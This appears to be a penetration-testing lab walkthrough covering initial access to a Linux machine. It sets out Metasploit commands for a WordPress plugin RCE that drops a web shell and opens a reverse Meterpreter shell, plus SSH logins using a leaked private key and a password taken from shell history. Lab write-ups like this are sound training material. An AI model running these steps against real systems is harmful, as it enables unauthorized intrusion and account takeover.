# 08 - Linux Initial Access

### Summary of Attack Vectors (Our "Low-Hanging Fruits")
1.  **WordPress RCE:** The `hash-form` plugin (v1.1.0) is vulnerable to a known Remote Code Execution (RCE) exploit available in the Metasploit Framework.
2.  **Exposed SSH Private Key:** An unencrypted `id_rsa` key for the user `john` was downloaded.
3.  **Potential Credentials:** The password `SuperSecurePass123` for the user `john` was found in the `.bash_history` file.

---

## 1. Exploitation via WordPress RCE (Metasploit)

This is a powerful, direct path to a shell. We will use the Metasploit Framework to exploit the vulnerable `hash-form` plugin.

### Step 1: Configure the Exploit Module
After starting Metasploit (`msfconsole -q`), we select and configure the exploit.

*   **Select the exploit:**
    ```
    msf6 > use exploit/multi/http/wp_hash_form_rce
    ```
*   **Configure the options:** The `options` command shows what needs to be set.
    *   **`RHOSTS`**: The remote host (target) IP address.
    *   **`RPORT`**: The remote port where the service is running.
    *   **`LHOST`**: The local host (our attacker machine) IP for the reverse shell to connect back to.
    *   **`SSL`**: Set to `true` since the target is using HTTPS.
    ```
    msf6 > set RHOSTS 10.129.12.10
    msf6 > set RPORT 443
    msf6 > set LHOST <your_tun0_ip>
    msf6 > set SSL true
    ```

### Step 2: Execute the Exploit
With all options set, we run the exploit.
```
msf6 > exploit
```

*   **Execution Flow:**

    1.  Metasploit confirms the target is vulnerable.
    2.  It retrieves a security token (nonce) from the WordPress application.
    3.  It uses the nonce to authenticate and upload a malicious PHP payload (a web shell).
    4.  It triggers the payload, which connects back to our machine.
    5.  A **Meterpreter session** opens, indicating a successful compromise.

### Step 3: Gaining an Interactive Shell
*   From the Meterpreter prompt, we can use the `sysinfo` command to confirm we are on the target.
*   The `shell` command drops us into a standard system shell on the target.
*   **Result:** We have gained initial access as the **`www-data`** user, which is the standard user account for the Apache web server.

---

## 2. Exploitation via SSH (Private Key & Password)

Our reconnaissance also provided two methods to access the `john` user account via SSH.

### a) Using the Exposed SSH Private Key
The `id_rsa` file we downloaded from the FTP server can be used to authenticate as the user `john`.

*   **Command:** The `-i` flag in the `ssh` client specifies an identity file (private key) to use for authentication.
    ```shell
    # Make the key file permissions more secure first
    chmod 600 id_rsa
    
    ssh -i id_rsa john@10.129.12.10
    ```
*   **Result:** **Success.** We are logged in directly as the user `john` without needing a password.

### b) Using the Discovered Password
The password `SuperSecurePass123` found in the `.bash_history` file can also be used.

*   **Command:**
    ```shell
    ssh john@10.129.12.10
    ```
*   When prompted for a password, we enter `SuperSecurePass123`.
*   **Result:** **Success.** We are logged in as the user `john`.

---

## Summary of Initial Access

We have successfully demonstrated **three distinct methods** for gaining initial access to the target system.

1.  **WordPress RCE:** Gained a shell as the low-privilege `www-data` user by exploiting a vulnerable plugin.
2.  **SSH Private Key:** Gained a shell as the user `john` by using an exposed, unencrypted private key.
3.  **SSH Password:** Gained a shell as the user `john` by using credentials found in a world-readable history file.

**Root Cause:** The initial access was made possible by a critical misconfiguration: an **anonymous-access FTP server** that exposed the contents of a user's home directory. This single flaw provided all the information necessary to compromise the system in multiple ways.
